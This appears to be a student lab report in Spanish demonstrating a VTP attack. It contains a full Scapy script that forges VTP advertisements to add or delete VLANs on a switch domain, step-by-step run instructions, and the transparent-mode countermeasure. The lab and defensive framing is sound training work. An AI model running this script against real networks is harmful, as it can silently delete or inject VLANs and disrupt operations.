# Ataque VTP — Manipulación de Base de Datos VLAN

**Nombre:** Henry Vicente Quezada | **Matrícula:** 2025-1332 | **Fecha:** 12 de Junio 2026

---

## 🎬 Video Demostrativo

https://youtu.be/so5_2xU2V84?list=PLhmycmsx2nBs_UFf6YQ6_QhJLSctMGgFH

---

## 1. Objetivo del Laboratorio

Demostrar cómo el protocolo VTP (VLAN Trunking Protocol) puede ser explotado para manipular la base de datos de VLANs de toda la red, agregando o eliminando VLANs arbitrarias desde un dispositivo externo no autorizado, y aplicar la contramedida correspondiente.

---

## 2. Objetivo del Script

Construir y enviar mensajes VTP maliciosos con un número de revisión superior al del servidor legítimo, logrando que el switch acepte cambios no autorizados en la base de datos de VLANs.

### 2.1 Parámetros Usados

| Parámetro   | Descripción                                  | Valor por defecto  |
| ----------- | -------------------------------------------- | ------------------ |
| `opcion`    | 1 = Agregar VLAN \| 2 = Borrar VLAN          | Menú interactivo   |
| `vlan_id`   | ID de la VLAN objetivo                       | Requerido          |
| `vlan_name` | Nombre de la VLAN (solo para agregar)        | Requerido          |
| `IFACE`     | Interfaz de red del atacante                 | `eth0`             |

### 2.2 Requisitos

- Sistema operativo: **Kali Linux**
- Python 3.x
- Librería Scapy: `pip install scapy`
- Permisos de root: `sudo`
- Puerto conectado al trunk del switch VTP Client (SW2)

---

## 3. Funcionamiento del Script

1. Construye un frame VTP Summary con `revision=9999` (mayor al legítimo)
2. Envía el Summary Advertisement al multicast `01:00:0c:cc:cc:cc`
3. Para agregar: construye un Subset Advertisement con la info de la VLAN nueva
4. Para borrar: envía un Subset sin VLAN info, forzando la eliminación de VLANs no listadas
5. El switch acepta los cambios por tener mayor Configuration Revision Number
6. Verifica el resultado con `show vlan brief` en SW1

```
Crear y guardar el script:
bash
nano /home/kali-linux/HenryVicenteQuezada_2025-1332_vtp_attack.py

Dar permisos de ejecución:
bash
chmod +x /home/kali-linux/HenryVicenteQuezada_2025-1332_vtp_attack.py

Pasos de ejecución:

Paso 1 — SW1: Ver VLANs antes del ataque
bash
show vlan brief
show vtp status

Paso 2 — SW1: Anotar el revision number actual
bash
show vtp status

Paso 3 — Kali: Ejecutar el ataque — Agregar VLAN
bash
sudo python3 /home/kali-linux/HenryVicenteQuezada_2025-1332_vtp_attack.py
Selecciona opcion: 1
VLAN ID a agregar: 50
Nombre de la VLAN: ATACANTE

Paso 4 — SW1: Verificar que la VLAN fue agregada
bash
show vlan brief

Paso 5 — Kali: Ejecutar el ataque — Borrar VLAN
bash
sudo python3 /home/kali-linux/HenryVicenteQuezada_2025-1332_vtp_attack.py
Selecciona opcion: 2
VLAN ID a borrar: 20

Paso 6 — SW1: Verificar que la VLAN fue borrada
bash
show vlan brief

Paso 7 — SW1: Aplicar contramedida
conf t
vtp mode transparent
end
write memory

Paso 8 — Kali: Ejecutar el ataque de nuevo
bash
sudo python3 /home/kali-linux/HenryVicenteQuezada_2025-1332_vtp_attack.py
Selecciona opcion: 1
VLAN ID a agregar: 77
Nombre de la VLAN: BLOQUEADA

Paso 9 — SW1: Verificar que el ataque fue bloqueado
bash
show vlan brief
show vtp status

🐍 Script — HenryVicenteQuezada_2025-1332_vtp_attack.py
python
#!/usr/bin/env python3
# =============================================================
# Nombre:     Henry Vicente Quezada
# Matricula:  2025-1332
# Ataque:     VTP Attack - Agregar y Borrar VLANs
# Fecha:      2026
# =============================================================

from scapy.all import *
import sys
import time

IFACE = "eth0"

def build_vtp_summary(domain="ITLA", revision=10000):
    dot3 = Dot3(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(IFACE))
    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
    snap = SNAP(OUI=0x00000c, code=0x2003)

    updater_id       = b'\x0a\x0d\x63\x02'     # 10.13.99.2
    update_timestamp = b"26061123075100"       # 12 bytes ASCII AAMMDDHHMMSS
    md5_digest       = b'\x00' * 16

    vtp_payload = (
        b'\x02'                                 # Version (VTPv2)
        + b'\x01'                               # Code: Summary Advertisement
        + b'\x00'                               # Followers
        + len(domain).to_bytes(1, 'big')
        + domain.encode().ljust(32, b'\x00')
        + revision.to_bytes(4, 'big')
        + updater_id
        + update_timestamp
        + md5_digest
    )
    return dot3 / llc / snap / Raw(load=vtp_payload)

def build_vtp_subset_add(domain="ITLA", revision=10000,
                         vlan_id=50, vlan_name="ATACANTE"):
    dot3 = Dot3(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(IFACE))
    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
    snap = SNAP(OUI=0x00000c, code=0x2003)

    name_bytes = vlan_name.encode().ljust(32, b'\x00')
    vlan_info = (
        b'\x06'                                 # VLAN info length field
        + b'\xa0'
        + b'\x00'
        + vlan_id.to_bytes(2, 'big')
        + b'\x03\xe8'                           # MTU 1000
        + b'\x00\x07\xa1\x20'
        + len(vlan_name).to_bytes(1, 'big')
        + name_bytes
    )
    vtp_payload = (
        b'\x02'                                 # Version (VTPv2)
        + b'\x02'                               # Code: Subset Advertisement
        + len(domain).to_bytes(1, 'big')
        + domain.encode().ljust(32, b'\x00')
        + revision.to_bytes(4, 'big')
        + b'\x01'
        + vlan_info
    )
    return dot3 / llc / snap / Raw(load=vtp_payload)

def build_vtp_subset_delete(domain="ITLA", revision=99999):
    dot3 = Dot3(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(IFACE))
    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
    snap = SNAP(OUI=0x00000c, code=0x2003)

    vtp_payload = (
        b'\x02'                                 # Version (VTPv2)
        + b'\x02'                               # Code: Subset Advertisement
        + len(domain).to_bytes(1, 'big')
        + domain.encode().ljust(32, b'\x00')
        + revision.to_bytes(4, 'big')
        + b'\x01'
        # Sin VLAN info = borra todas las VLANs no listadas
    )
    return dot3 / llc / snap / Raw(load=vtp_payload)

def agregar_vlan(vlan_id, vlan_name):
    print(f"\n[*] Enviando VTP Attack: AGREGAR VLAN {vlan_id} - {vlan_name}")
    sendp(build_vtp_summary(revision=10000), iface=IFACE, verbose=False)
    time.sleep(0.5)
    sendp(build_vtp_subset_add(revision=10000, vlan_id=vlan_id,
          vlan_name=vlan_name), iface=IFACE, count=3, verbose=False)
    print(f"[+] VLAN {vlan_id} enviada.")
    print(f"[*] Verifica en SW1: show vlan brief")

def borrar_vlan(vlan_id):
    print(f"\n[*] Enviando VTP Attack: BORRAR VLAN {vlan_id}")
    sendp(build_vtp_summary(revision=10001), iface=IFACE, verbose=False)
    time.sleep(0.5)
    sendp(build_vtp_subset_delete(revision=10001), iface=IFACE,
          count=3, verbose=False)
    print(f"[+] Paquete de borrado enviado.")
    print(f"[*] Verifica en SW1: show vlan brief")

if __name__ == "__main__":
    print("=" * 55)
    print("       ATAQUE VTP — AGREGAR Y BORRAR VLANs")
    print("       Autor: Henry Vicente Quezada")
    print("       Matricula: 2025-1332")
    print("=" * 55)
    print(f"[*] Interfaz     : {IFACE}")
    print(f"[*] Dominio VTP  : ITLA")
    print(f"[*] Presiona Ctrl+C para detener\n")
    print("1. Agregar VLAN")
    print("2. Borrar VLAN")

    opcion = input("\nSelecciona opcion: ").strip()

    if opcion == "1":
        vid    = int(input("VLAN ID a agregar (ej: 50): "))
        nombre = input("Nombre de la VLAN (ej: ATACANTE): ")
        agregar_vlan(vid, nombre)
    elif opcion == "2":
        vid = int(input("VLAN ID a borrar: "))
        borrar_vlan(vid)
    else:
        print("[-] Opcion invalida")
        sys.exit(1)


🛡️ Contramedida aplicada

SW1(config)# vtp mode transparent
SW1(config)# end
SW1# write memory
SW2(config)# vtp mode transparent
SW2(config)# end
SW2# write memory
! Verificación
SW1# show vtp status
SW2# show vtp status
SW1# show vlan brief
```

---

## 4. Documentación de la Red

### Topología

<img width="897" height="710" alt="image" src="https://github.com/user-attachments/assets/ba2d60f0-290c-418c-8846-297782eca1e4" />

### Tabla de Direccionamiento

| Dispositivo | Interfaz | VLAN | IP          | Máscara | Rol                      |
| ----------- | -------- | ---- | ----------- | ------- | ------------------------ |
| R1          | e0/0.10  | 10   | 10.13.32.1  | /24     | Gateway VLAN10 TI        |
| R1          | e0/0.20  | 20   | 10.13.33.1  | /24     | Gateway VLAN20 Gerencia  |
| R1          | e0/0.99  | 99   | 10.13.99.1  | /24     | Gateway Management       |
| SW1         | vlan 99  | 99   | 10.13.99.2  | /24     | Gestión Switch VTP Server|
| SW2         | vlan 99  | 99   | 10.13.99.3  | /24     | Gestión Switch VTP Client|
| VPC10       | eth0     | 10   | 10.13.32.11 | /24     | Cliente VLAN10           |
| VPC20       | eth0     | 20   | 10.13.33.11 | /24     | Cliente VLAN20           |
| Kali        | eth0     | 10   | 10.13.32.5  | /24     | **Atacante**             |

### VLANs

| VLAN | Nombre     | Descripción                    |
| ---- | ---------- | ------------------------------ |
| 10   | TI         | Red de usuarios TI             |
| 20   | Gerencia   | Red de Gerencia                |
| 99   | Management | Red de gestión de dispositivos |

### Interfaces SW2 (VTP Client)

| Puerto | Modo              | VLAN     | Conectado a    |
| ------ | ----------------- | -------- | -------------- |
| e0/0   | Trunk 802.1q      | 10,20,99 | SW1 e0/1       |
| e0/1   | Access            | 10       | VPC10          |
| e0/2   | Access            | 20       | VPC20          |
| e0/3   | dynamic desirable | 10       | **Kali Linux** |

---
## 5. Capturas de Pantalla

Antes del ataque

<img width="1180" height="912" alt="image" src="https://github.com/user-attachments/assets/a8241175-5f8d-4f99-86aa-7fbf0d7f8e33" />

📷 SW1# show vlan brief — Solo VLANs 10, 20 y 99

## Durante la ejecución

<img width="838" height="598" alt="image" src="https://github.com/user-attachments/assets/86db6cc0-64a9-4c11-ab60-547840f7d4bf" />

📷 Kali ejecutando script — Selecciona opción 1, VLAN 50 "ATACANTE"
 
## Impacto del ataque

<img width="703" height="449" alt="image" src="https://github.com/user-attachments/assets/3b8a9bda-a7a3-4208-a082-828450901ecf" />

📷 SW1# show vlan brief — VLAN 50 ATACANTE aparece sin ser creada manualmente ✅

## Ataque 2: BORRAR VLAN 20

<img width="878" height="517" alt="image" src="https://github.com/user-attachments/assets/b6b2fcf0-fe73-47ff-85de-6abc932fa0e0" />

Impacto del ataque

<img width="705" height="473" alt="image" src="https://github.com/user-attachments/assets/51e8c148-f3c8-404e-916d-70dd28e46a73" />

📷 SW1# show vlan brief — VLAN 20 Gerencia desaparece del dominio ✅

## Contramedida Aplicada: VTP Transparent

<img width="705" height="463" alt="image" src="https://github.com/user-attachments/assets/b0d10be3-02c5-4e46-adc5-7ad7f79ec828" />

📷 SW1 configuración

## Ataque nuevamente bloqueado

<img width="671" height="474" alt="image" src="https://github.com/user-attachments/assets/ded19d5f-777d-43fb-9567-20fa43609b80" />

📷 Kali intenta agregar VLAN 77

<img width="705" height="540" alt="image" src="https://github.com/user-attachments/assets/002cbf37-6d92-4242-9ff1-9dde01d50f2f" />

📷 SW1# show vlan brief — VLAN 77 NO aparece (ataque bloqueado) ✅

(VLAN 77 BLOQUEADA NO aparece — VTP Transparent rechaza el anuncio)

---

En modo Transparent el switch ignora todos los anuncios VTP recibidos y no propaga cambios al dominio. Los paquetes VTP maliciosos son descartados silenciosamente.

